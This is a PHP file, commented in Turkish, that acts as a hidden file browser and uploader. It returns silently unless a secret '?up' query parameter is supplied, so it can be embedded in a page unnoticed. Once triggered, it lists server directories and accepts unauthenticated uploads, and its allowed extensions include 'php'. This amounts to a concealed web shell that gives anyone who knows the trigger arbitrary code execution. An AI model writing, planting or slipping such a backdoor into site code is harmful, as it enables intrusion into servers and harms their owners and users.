<?php
// Hangi dizinde olduğumuzu belirliyoruz
$root = __DIR__; // PHP dosyasının bulunduğu dizin
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root;

// Eğer ?up parametresi yoksa, sayfanın geri kalan kısmını etkilemeden çık
if (!isset($_GET['up'])) {
    return; // sayfayı durduruyoruz
}

// Güvenlik: Yalnızca belirtilen dizinin altında gezinebilmek için kontrol
if (strpos($current_dir, realpath($root)) !== 0) {
    die('İzin verilmedi!');
}

// Dosya yükleme işlemi
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file'])) {
    // Yüklenebilecek dosya uzantılarını belirleyelim
    $allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'pdf', 'doc', 'docx', 'zip', 'txt', 'mp4', 'mp3', 'csv', 'xls', 'php'];
    
    $file_name = basename($_FILES['file']['name']);
    $file_extension = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));
    $target_file = $current_dir . '/' . $file_name;

    // Dosya uzantısının izin verilenler arasında olup olmadığını kontrol edelim
    if (!in_array($file_extension, $allowed_extensions)) {
        die('Yüklemek istediğiniz dosya uzantısı izin verilenler arasında değil!');
    }

    // Dosya boyutunu kontrol et
    if ($_FILES['file']['size'] > 5 * 1024 * 1024) { // 5MB limit
        die('Dosya boyutu 5MB\'dan büyük olamaz!');
    }

    // Yükleme işlemini gerçekleştir
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
        echo 'Dosya başarıyla yüklendi: ' . htmlspecialchars($file_name);
    } else {
        echo 'Dosya yüklenemedi!';
    }
}

// Mevcut dizindeki dosyaları ve dizinleri listeliyoruz
$files = scandir($current_dir);

function is_image($file) {
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    return in_array($ext, ['jpg', 'jpeg', 'png', 'gif']);
}

// Dizinlerde gezinme bağlantılarını oluşturma
$navigation_links = [];
if ($current_dir != realpath($root)) {
    $navigation_links[] = '<a href="?dir=' . urlencode(dirname($current_dir)) . '&up=' . urlencode($_GET['up']) . '">.. (Üst Dizin)</a>';
}

foreach ($files as $file) {
    if ($file == '.' || $file == '..') continue;
    $file_path = $current_dir . '/' . $file;
    if (is_dir($file_path)) {
        $navigation_links[] = '<a href="?dir=' . urlencode($file_path) . '&up=' . urlencode($_GET['up']) . '">' . htmlspecialchars($file) . '</a>';
    } else {
        $navigation_links[] = htmlspecialchars($file) . (is_image($file) ? ' <img src="' . htmlspecialchars($file_path) . '" style="width:100px;"/>' : '');
    }
}

// Kullanıcıya dosyaları ve dizinleri gösterme
echo "Mevcut Dizin: " . htmlspecialchars($current_dir) . "<br>";
echo "<ul>";
foreach ($navigation_links as $link) {
    echo "<li>$link</li>";
}
echo "</ul>";

// Dosya Yükleme Formu
echo '<h2>Dosya Yükle</h2>';
echo '<form action="" method="post" enctype="multipart/form-data">';
echo '<input type="file" name="file" required>';
echo '<input type="submit" value="Yükle">';
echo '</form>';
?>
